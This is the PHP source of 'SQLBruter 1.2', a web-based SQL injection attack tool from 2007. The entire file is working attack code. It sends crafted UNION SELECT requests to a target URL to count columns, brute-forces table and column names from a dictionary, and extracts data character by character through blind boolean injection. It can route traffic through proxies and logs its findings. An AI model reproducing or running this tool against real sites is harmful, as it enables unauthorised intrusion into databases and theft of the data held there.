<?
###############################################
#   SQLBruter v1.2                            #
#   (c)oded by Raz0r                          #
#   ICQ 502210                                #
#   Greets to InAttack                        #
###############################################
error_reporting(7);
set_magic_quotes_runtime(0);
@set_time_limit(0);
@ini_set("max_execution_time",0);
@ini_set("output_buffering",0);
@ini_set("default_socket_timeout",5);
if (function_exists("ob_start")) ob_start('ob_tidyhandler');
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
$self=basename($HTTP_SERVER_VARS['PHP_SELF']);
echo "<html>
<!-- Ќу чего уставилс€ как маздай на новое устройство? -->
<head><title>::SQLBruter 1.2 (coded by Raz0r)::</title>
<style>
Body {
; Font-Family: Arial;
; Font-size: 14px;
}
INPUT.speed {
; Font-Family: Arial;
; Font-size: 14px;
; Border-style: none;
; BackGround-color: transparent;
}
TABLE {
; Font-Family: Arial;
; Font-size: 14px;
}
TD.strconv {
; Font-Family: Verdana;
; Font-size: 4px;
}
DIV.copyright {
; Font-Family: Arial;
; Font-size: 12px;
; color: SILVER;
}
</style>
</head>";
if ((!isset($_POST['submit'])) && (!isset($_GET['encode'])))
{
die ("
<body onLoad=\"document.getElementById('1').style.display = 'none'; document.getElementById('2').style.display = 'none'; document.getElementById('3').style.display = 'none'; document.getElementById('4').style.display = 'none';\">

<Font Face=\"arial\">
<Center>
<H1><Font color=#DDDDDD>SQLBruter 1.2</font></H1>
<Form Method=\"Post\">
<Table CellSpacing=\"0\" CellPadding=\"1\" bgcolor=#DDDDDD>
<Tr>
<Td>
<Table CellSpacing=\"0\" CellPadding=\"3\" bgcolor=#efefef>
<Tr>
<Td>
<table><tr><td width=100>URL</td> <td><Input Type=\"text\" Name=\"url_post\" Value=\"http://\" SIZE=40></td></table>
<table><tr><td width=100>String</td> <td><Input Type=\"text\" Name=\"string_post\"  SIZE=40></td></table>
<table><tr><td width=100>log file</td> <td><Input Type=\"text\" Name=\"log_post\" Value=\"log.txt\" SIZE=40></td></table>
<table><tr><td width=100>proxy</td><td><Input Type=\"text\" Name=\"proxy_post\" SIZE=40></td></table>
<table><tr><td valign=top width=100>mode</td><td>
<Input Type=\"radio\" Name=\"mode_post\" Value=\"1\" onClick=\"document.getElementById('1').style.display = 'block'; document.getElementById('2').style.display = 'none'; document.getElementById('3').style.display = 'none'; document.getElementById('4').style.display = 'none';\">Number of selected rows bruteforce&nbsp;<BR>
<Input Type=\"radio\" Name=\"mode_post\" Value=\"2\" onClick=\"document.getElementById('1').style.display = 'none'; document.getElementById('2').style.display = 'block'; document.getElementById('3').style.display = 'none'; document.getElementById('4').style.display = 'none';\">Names of tables bruteforce&nbsp;<BR>
<Input Type=\"radio\" Name=\"mode_post\" Value=\"3\" onClick=\"document.getElementById('1').style.display = 'none'; document.getElementById('2').style.display = 'none'; document.getElementById('3').style.display = 'block'; document.getElementById('4').style.display = 'none';\">Names of columns bruteforce<Br>
<Input Type=\"radio\" Name=\"mode_post\" Value=\"4\" onClick=\"document.getElementById('1').style.display = 'none'; document.getElementById('2').style.display = 'none'; document.getElementById('3').style.display = 'none'; document.getElementById('4').style.display = 'block';\">Character-oriented bruteforce</td></table>
<div id=\"1\"><table><tr><td width=200>max number of rows to brute</td> <td valign=top>
<Input Type=\"text\" Name=\"max_post\" Value=\"20\" SIZE=2></td></table>
<table><tr><td width=200>get columns which can output information</td> <td valign=top>
<Input Type=\"checkbox\" Name=\"getcols_post\" checked></td></table></div>
<div id=\"2\"><table><tr><td width=200>number of the selected rows</td> <td valign=top>
<Input Type=\"text\" Name=\"rows1_post\" Value=\"15\" SIZE=2></td></table><table><tr><td width=200>path to the dictionary file</td><td>
<Input Type=\"text\" Name=\"dic1_post\" Value=\"dic.txt\" SIZE=20></td></tr><table><tr><td width=200>prefix</td><td>
<Input Type=\"text\" Name=\"pref_post\" SIZE=20></td></tr></table></div>
<div id=\"3\"><table><tr><td width=200>number of the selected rows</td> <td valign=top>
<Input Type=\"text\" Name=\"rows2_post\" Value=\"15\" SIZE=2></td></table><table><tr><td width=200>path to the dictionary file</td><td>
<Input Type=\"text\" Name=\"dic2_post\" Value=\"dic.txt\" SIZE=20></td></tr><table><tr><td width=200>name of the table to brute</td><td>
<Input Type=\"text\" Name=\"table_post\" SIZE=20></td></tr></table></div>
<div id=\"4\"><table title=\"e.g. user(), version(), etc\"><tr><td width=200>DB query</td> <td valign=top>
<Input Type=\"text\" Name=\"query_post\" Value=\"user()\" SIZE=20></td></table><table><tr><td width=200>use specific range of chars</td><td>
<Input Type=\"text\" Name=\"ot_post\" Value=\"97\" SIZE=3>&nbsp;<Input Type=\"text\" Name=\"do_post\" Value=\"122\" SIZE=3></td></tr></table></div>
</Td>
</Tr>
</Table>
</Td>
</Tr>
</Table><BR><A Href=\"$self?encode\">String converter</A><Br><Br>
<Input Type=\"submit\" Value=\"GO!\" name=\"submit\">
<BR><BR><Div class=copyright><B>Raz0r</B> 2007 &copy;</Div></Center>
</body>
</html>"
);
}
elseif (isset($_GET['encode']))
{
$strconv = $_POST['strconv_post'];
$len = strlen($strconv);
echo "<body>
<Center>
<H1><Font color=#DDDDDD>SQLBruter 1.2</font></H1>
<Form Method=\"Post\">
<Table CellSpacing=\"0\" CellPadding=\"1\" bgcolor=#DDDDDD width=90%>
<Tr>
<Td>
<Table CellSpacing=\"0\" CellPadding=\"3\" bgcolor=#efefef width=100%>
<Tr>
<Td>
<table><tr><td width=100%>
<Input Type=\"text\" Name=\"strconv_post\" Value=\"";if (!empty($strconv))echo $strconv; else echo "enter text here"; echo "\">
<Input Type=\"submit\" name=\"submit_encode\" Value=\"Encode\"><Br><Br></td></tr></table>";
         for ($i = 0; $i < $len; $i++) 
         {
         $substring = substr($strconv,$i,1);
         $ascii_code = ord($substring);
         if ($i == ($len - 1)) $res .= $ascii_code;
         else $res .= $ascii_code.",";
         }
if (($len > 0) && (isset($_POST['submit_encode']))) $ascii = "CHAR(".$res.")"; else $ascii = null;
if (($len > 0) && (isset($_POST['submit_encode']))) $hex = "0x".bin2hex($strconv); else $hex = null;
if(isset($_POST['submit_encode'])) $base64 = base64_encode($strconv);
if(isset($_POST['submit_encode']))$md5= md5($strconv);
if(isset($_POST['submit_encode']))$sha1 = sha1($strconv);
echo "<Table CellSpacing=\"0\" CellPadding=\"1\" bgcolor=#DDDDDD width=90%>
<Tr>
<Td>
<Table CellSpacing=\"0\" CellPadding=\"3\" bgcolor=#efefef width=100%>
<Tr><Td>
<table><tr><td width=200>ASCII (SQL syntax)</td> <td><TextArea Name=result1 Cols=\"100\" Rows=\"2\">$ascii</TextArea></td><Td><input type=button name=Button value=\"Highlight\" onClick=result1.select();result1.focus()></Td></table>
<table><tr><td width=200>HEX</td> <td><TextArea Name=result2 Cols=\"100\" Rows=\"2\">$hex</TextArea></td><Td><input type=button name=Button value=\"Highlight\" onClick=result2.select();result2.focus()></Td></table>
<table><tr><td width=200>BASE64</td> <td><TextArea Name=result3 Cols=\"100\" Rows=\"2\">$base64</TextArea></td><Td><input type=button name=Button value=\"Highlight\" onClick=result3.select();result3.focus()></Td></table>
<table><tr><td width=200>MD5</td> <td><TextArea Name=result4 Cols=\"100\" Rows=\"2\">$md5</TextArea></td><Td><input type=button name=Button value=\"Highlight\" onClick=result4.select();result4.focus()></Td></table>
<table><tr><td width=200>SHA1</td> <td><TextArea Name=result5 Cols=\"100\" Rows=\"2\">$sha1</TextArea></td><Td><input type=button name=Button value=\"Highlight\" onClick=result5.select();result5.focus()></Td></table>
</Td>
</Td>
</Tr>
</Table>
</Td>
</Tr>
</Table></Td>
</Tr>
</Table></Td>
</Tr>
</Table><Div class=copyright><BR><BR><B>Raz0r</B> 2007 &copy;</Div></Center></body></html>";
die;
}
if (!empty($_POST['url_post'])) $url = $_POST['url_post']; else die("NO URL");
if (!empty($_POST['string_post'])) $string = $_POST['string_post']; else die("NO STRING");
if (!empty($_POST['mode_post'])) $mode = $_POST['mode_post']; else die("NO MODE");
if (!empty($_POST['log_post'])) $log = $_POST['log_post'];
if (!empty($_POST['proxy_post']))$proxy = $_POST['proxy_post'];
$c = preg_match($proxy_regex,$proxy);
if (!$c) die("NOT A VALID PROXY");
$conn = @parse_url($url);
$host = $conn["host"];
$path = $conn["path"];
$param = $conn["query"];
if (isset($conn["port"])) $port = $conn["port"]; else $port=80;
switch ($mode)
{
case 1:
if (!empty($_POST['max_post'])) $max = $_POST['max_post']; else die("NO MAX NUMBER OF ROWS");
if (!empty($_POST['getcols_post'])) $getcols = $_POST['getcols_post'];
if ($getcols == "on") $getcols = 1; else $getcols = 0;
show_params();
mode1($url, $string, $max, $getcols);
break;
case 2:
if (!empty($_POST['rows1_post'])) $rows = $_POST['rows1_post']; else die("NO ROWS");
if (!empty($_POST['dic1_post'])) $dic = $_POST['dic1_post']; else die("NO DICTIONARY");
if (!empty($_POST['pref_post'])) $pref = $_POST['pref_post'];
show_params();
brute($url, $string, $rows, $dic, FALSE);
break;
case 3:
if (!empty($_POST['rows2_post'])) $rows = $_POST['rows2_post']; else die("NO ROWS");
if (!empty($_POST['dic2_post'])) $dic = $_POST['dic2_post']; else die("NO DICTIONARY");
if (!empty($_POST['table_post'])) $table = $_POST['table_post']; else die("NO TABLE");
show_params();
brute($url, $string, $rows, $dic, $table);
break;
case 4:
if (!empty($_POST['query_post'])) $query = $_POST['query_post']; else die("NO QUERY");
if (!empty($_POST['ot_post'])) $ot = $_POST['ot_post']; else $ot = 97;
if (!empty($_POST['do_post'])) $do = $_POST['do_post']; else $do = 122;
show_params();
mode4($url, $string, $query, $ot, $do);
break;
}
function mode_name($mode)
{
$modes = array("Number of selected rows bruteforce", "Names of tables bruteforce", "Names of columns bruteforce", "Character-oriented bruteforce");
return $modes[$mode-1];
}
function show_params()
{
global $url, $string, $mode, $log, $proxy, $max, $rows, $dic, $pref, $table, $query, $ot, $do;
$mode_name = mode_name($mode);
echo "
<body>
<script>
<!--
var ie=document.all?1:0;
var ns=document.getElementById&&!document.all?1:0;
function InsertText(text)
{
	if(ie)
	{
	document.all.text.value=text;
	}


	else if(ns)
	{
	document.forms['speed'].elements['text'].value=text;
	}

	else
	alert(\"Your browser is NOT supported\");
}
-->
</script>
<Font Face=\"arial\">
<Center>
<H1><Font color=#DDDDDD>SQLBruter 1.2</font></H1>
<Table CellSpacing=\"0\" CellPadding=\"0\" width=90%>
<Tr>
<Td>
<Table CellSpacing=\"0\" CellPadding=\"1\" bgcolor=#DDDDDD width=100%>
<Tr>
<Td>
<Table CellSpacing=\"0\" CellPadding=\"3\" bgcolor=#efefef width=100%>
<Tr>
<Td>
<table><tr><td width=150><B>URL</B></td> <td>".htmlspecialchars($url)."</td></table>
<table><tr><td width=150><B>String</B></td> <td>".htmlspecialchars($string)."</td></table>
<table><tr><td width=150><B>Mode</B></td><td>".htmlspecialchars($mode_name)."</td></table>
";
if (isset($log)) echo "<table><tr><td width=150><B>Log file</B></td> <td>".htmlspecialchars($log)."</td></table>";
if (isset($proxy)) echo "<table><tr><td width=150><B>Proxy</B></td> <td>".htmlspecialchars($proxy)."</td></table>";
switch ($mode)
{
case 1:
echo "<table><tr><td width=150><B>Rows max number</B></td> <td>".htmlspecialchars($max)."</td></table>";
break;
case 2:
echo "<table><tr><td width=150><B>Number of the selected rows</B></td> <td>".htmlspecialchars($rows)."</td></table>";
echo "<table><tr><td width=150><B>Dictionary</B></td> <td>".htmlspecialchars($dic)." (".checkdic($dic)." words)</td></table>";
if (isset($pref)) echo "<table><tr><td width=150><B>Prefix</B></td> <td>".htmlspecialchars($pref)."</td></table>";
break;
case 3:
echo "<table><tr><td width=150><B>Number of the selected rows</B></td> <td>".htmlspecialchars($rows)."</td></table>";
echo "<table><tr><td width=150><B>Dictionary</B></td> <td>".htmlspecialchars($dic)." (".checkdic($dic)." words)</td></table>";
echo "<table><tr><td width=150><B>Table</B></td> <td>".htmlspecialchars($table)."</td></table>";
break;
case 4:
echo "<table><tr><td width=150><B>Query</B></td> <td>".htmlspecialchars($query)."</td></table>";
echo "<table><tr><td width=150><B>From</B></td> <td>".htmlspecialchars($ot)."</td></table>";
echo "<table><tr><td width=150><B>To</B></td> <td>".htmlspecialchars($do)."</td></table>";
break;
}
echo "</Td></Tr></Table></Td></Tr></Table><BR>";
flush();
}
function sendpacket($packet) 
{
global $host, $port, $proxy;
         if (empty($proxy))
         {
         $ock = @fsockopen(@gethostbyname($host),$port);
         stream_set_blocking($ock, 0);
         stream_set_timeout($ock,600);
                  if (!$ock) 
                  {
                  echo "No response from ".$host.":80<br>";
                  }
                  else
                  {
                  fputs($ock, $packet);
                  $html="";
                           while (!feof($ock)) 
                           {
                           $html.=fgets($ock);
                           }
                  }
         }
         else
         {
         $parts=explode(":",$proxy);
         $ock2=@fsockopen($parts[0],$parts[1]);
                  if (!$ock2) 
                  {
                  echo "No response from proxy ($proxy)";
                  }
                  else
                  {
                  fputs($ock2,$packet);
                  $html="";
                           while ((!feof($ock2)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) 
                           {
                           $html.=fread($ock2,1);
                           }
                  }
          }
return $html;     
}
function savelogfile($logfile, $mode, $text)
{
if (!is_file($logfile))
  {
    $s = @fopen($logfile,"w");
    fclose($s);
    chmod($logfile,0777);
  }
$fp = @fopen($logfile,"a");
fputs($fp, "*** SQLBruter's report [".date(" l dS 0f F Y h:i:s A ")."] ***\r\n");
fputs($fp, "[~] ".mode_name($mode)."\r\n".$text."\r\n");
fputs($fp, "____________________________________________________________________\r\n");
fclose($fp);  
}
function checkdic($dic)
{
$handle = @fopen($dic, "r");
         if ($handle)
         {
                  while (!feof($handle))
                  {
                  $buffer = fgets($handle, 4096);
                  $x++;
                  }
         fclose($handle);
         }
         else die("INVALID DICTIONARY");
return $x;
}
function mode1($url, $string, $max, $getcols)
{
global $log, $proxy, $host, $path, $param;
echo "<Form name=\"speed\"><Input Type=\"text\" Name=\"text\" Value=\"Please wait...\" size=100 class=speed DISABLED=yes></Form>"; flush();
         for ($i = 0; $i < $max; $i++)
         {
                  if ($i > 0) $null .=",0"; else $null = "0";
         $packet = "GET ".$path."?".$param."%20UNION%20SELECT%20".$null."/* HTTP/1.1\r\n";
         $packet .= "Host: ".$host."\r\n";
         $packet .= "Connection: Close\r\n\r\n";
         $content = sendpacket($packet);
                  if (strpos($content, $string)>0)
                  {
                        if ($getcols == 1)
                        {
                                        for ($z = 1; $z <= ($i+1); $z++)
                                        {
                                        if ($z > 1) $razor .=",0x72617a3072".bin2hex($z);
                                        else $razor = "0x72617a3072".bin2hex($z);
                                        }
                           $temp = explode("=", $param);
                           $temp[(sizeof($temp)-1)] = "-1";
                           $param = implode("=", $temp);
                           $packet = "GET ".$path."?".$param."%20UNION%20SELECT%20".$razor."/* HTTP/1.1\r\n";
                           $packet .= "Host: ".$host."\r\n";
                           $packet .= "Connection: Close\r\n\r\n";
                           $content = sendpacket($packet);
                                       for ($y = 1; $y <= ($i+1); $y++)
                                       {
                                       if (strpos($content, ("raz0r".$y)) > 0) $visiblecols[] .= $y;
                                       }
                           if (!is_array($visiblecols)) {$nocols = 1;}
                        }
                  echo "<script>InsertText('Done!');</script>";
                  echo "<Table CellSpacing=\"0\" CellPadding=\"1\" bgcolor=#DDDDDD width=100%><Tr><Td><Table CellSpacing=\"0\" CellPadding=\"3\" bgcolor=#efefef width=100%><Tr><Td>Number of rows is ".($i+1)."<BR>";
                  if (($getcols == 1) && ($nocols != 1)) {$result = $url." UNION SELECT ".$null."/*<BR>Columns ".@implode(",", $visiblecols)." can output information";}
                  elseif ($nocols == 1) $result = $url." UNION SELECT ".$null."/*<BR>No columns which can output information";
                  else $result = $url." UNION SELECT ".$null."/*";
                  echo $result;
                  echo "</Td></Tr></Table></Td></Tr></Table></Td></Tr></Table></body></html>";
                  flush();
                  if (isset($log)) {$result = str_replace("<BR>", "\r\n", $result); savelogfile($log, 1, $result);}
                  die;
                  }
         }
         echo "<script>InsertText('Failed! Try to increase max number of selected rows');</script>"; flush();
}
function brute($url, $string, $rows, $dic, $table)
{
global $log, $proxy, $pref, $host, $path, $param;
$x = checkdic($dic);
echo "<Form name=\"speed\"><Input Type=\"text\" Name=\"text\" Value=\"\" size=100 class=speed DISABLED=yes></Form>";
flush();
$handle = @fopen($dic, "r");
         if ($handle)
         {
         $begin_time = time();
                           if ($table === FALSE) 
                           {
                                    for ($i = 0; $i < $rows; $i++)
                                    {
                                    if ($i > 0) $null .=",0";
                                    else $null = "0";
                                    }
                           }
                           else
                           {
                                    for ($i = 0; $i < ($rows-1); $i++)
                                    {
                                    if ($i > 0) $null .=",0";
                                    else $null = "0";
                                    }
                           }
                           for ($i = 0; $i < $x; $i++)
                           {
                           $word = fgets($handle, 4096);
                           $word = ereg_replace("\n", "", $word);
                           $word = ereg_replace("\r", "", $word);
                           $word = trim($word);
                           if (isset($pref)) $word = $pref."_".$word;
                                    if (($word !== "") & (!is_numeric($word)) & (!strpos($word,"-")) & (!strpos($word, " ")))
                                    {
                                    if ($table === FALSE) $packet = "GET ".$path."?".$param."%20UNION%20SELECT%20".$null."%20FROM%20".urlencode($word)."/* HTTP/1.1\r\n";
                                    else $packet = "GET ".$path."?".$param."%20UNION%20SELECT%20".$null.",".urlencode($word)."%20FROM%20".$table."/* HTTP/1.1\r\n";
                                    $packet .= "Host: ".$host."\r\n";
                                    $packet .= "Connection: Close\r\n\r\n";
                                    $content = sendpacket($packet);
                                    $z++;
                                    $r++;
                                             if ($begin_time + 1 == time())
                                             {
                                             $begin_time += 1;
                                             $percent = round($z/$x * 100);
                                             $words_per_second = $r;
                                             $r = 0;
                                             echo "<script>InsertText('Completed - ".$percent."%\tCurrent speed - ".$words_per_second." words per second');</script>";
                                             flush();
                                             }
                                                      elseif ($begin_time + 1 < time())
                                                      {
                                                      $begin_time = time() + 1;
                                                      $percent = round($z/$x * 100);
                                                      $words_per_second = $r;
                                                      $r = 0;
                                                      echo "<script>InsertText('Completed - ".$percent."%\tCurrent speed - ".$words_per_second." words per second');</script>";
                                                      flush();
                                                      }
                                    if (strpos($content, $string)>0)
                                    {
                                             if ($table === FALSE) 
                                             {
                                             $result = $url." UNION SELECT ".$null." FROM ".$word."/*";
                                             echo "<Table CellSpacing=\"0\" CellPadding=\"1\" bgcolor=#DDDDDD width=100%><Tr><Td><Table CellSpacing=\"0\" CellPadding=\"3\" bgcolor=#efefef width=100%><Tr><Td>Table was found - $word<br>$result</Td></Tr></Table></Td></Tr></Table><BR>";
                                             }
                                             else
                                             {
                                             $result = $url." UNION SELECT ".$null.",".$word." FROM ".$table."/*";
                                             echo "<Table CellSpacing=\"0\" CellPadding=\"1\" bgcolor=#DDDDDD width=100%><Tr><Td><Table CellSpacing=\"0\" CellPadding=\"3\" bgcolor=#efefef width=100%><Tr><Td>Column was found - $word<br>$result</Td></Tr></Table></Td></Tr></Table><BR>";
                                             }
                                             flush();
                                             if (isset($log))
                                             {
                                             if ($table === FALSE) savelogfile($log, 2, $result);
                                             else savelogfile($log, 3, $result);
                                             }
                                   }                                    
                           }
                  }
         }

}
function found($min, $max, $sp, $result)
{
if (($max-$min)<5) crack($min,$max, $sp, $result);
$r = round($max - ($max-$min)/2);
$check = ">$r";
         if ( check($check, $sp, $result)) 
         {
         if (!empty($result)) $status = "(".$result.")";  
         print "<script>InsertText('Now checking > $r $status');</script>";
         flush();
         found($r,$max, $sp, $result); 
         }
         else 
         {
         if (!empty($result)) $status = "(".$result.")"; 
         print "<script>InsertText('Now checking < $r $status');</script>";
         flush(); 
         found($min,$r+1, $sp, $result);
         }
}
function crack($cmin, $cmax, $sp, $result)
{
global $ot, $do, $output, $query;
$i = $cmin;
$check1 = ">0";
         if (check($check1, $sp, $result))
         {
                  while ($i<=$cmax)
                  {
                  $check = "=$i";
                  if (!empty($result)) $status = "(".$result.")"; 
                  echo "<script>InsertText('Now checking $check $status');</script>";
                  flush();
                           if (check($check, $sp, $result))
                           {
                           $result .= chr($i);
                           $sp++;
                                    if (!isset($ot) || !isset($do))
                                    {
                                    $ot = 97;
                                    $do = 122;
                                    }
                           found($ot, $do, $sp, $result);
                           }
                  $i++;
                  }
                  if (((empty($result)) && ($sp == 2)) or (empty($result)))
                  {
                  echo "<script>InsertText('Failed!');</script>";
                  flush();
                  die;
                  }
                  else
                  {
                  if (isset($output)) save_result("\n Query ".$query." - ".$result."\n");
                  echo "<script>InsertText('Not full result ($result). Try to increase the range of chars.');</script>";
                  flush();
                  die("</tr></td></table></body></html>");
                  }
         }
         if (((empty($result)) && ($sp == 2)) or (empty($result)))
         {
         echo "<script>InsertText('Failed!');</script>";
         flush();
         die;
         }
         else die("<script>InsertText('Done!');</script><Table CellSpacing=\"0\" CellPadding=\"1\" bgcolor=#DDDDDD width=100%><Tr><Td><Table CellSpacing=\"0\" CellPadding=\"3\" bgcolor=#efefef width=100%><Tr><Td><strong>$query</strong> - $result</Td></Tr></Table></Td></Tr></Table></body></html>");
}
function check($check, $sp, $result)
{
global $path, $host, $param, $query, $string;
$packet = "GET ".$path."?".$param."%20AND%20ascii(lower(substring(".urlencode($query).",".$sp.",1)))".$check." HTTP/1.1\r\n";
$packet .= "Host: ".$host."\r\n";
$packet .= "Connection: Close\r\n\r\n";
$html = sendpacket($packet);
if (strpos($html,$string) > 0) return 1; 
return 0;
}
function mode4($url, $string, $query, $ot, $do)
{
global $log, $proxy, $host, $path, $param;
echo "<Form name=\"speed\"><Input Type=\"text\" Name=\"text\" Value=\"\" size=100 class=speed DISABLED=yes></Form>";
flush();
found($ot, $do, 1, "");
}
if (($mode_post == 2) || ($mode_post == 3) ) echo "<script>InsertText('Completed - 100%');</script>";
echo "</Td></Tr></Table></body></html>";
flush();
?>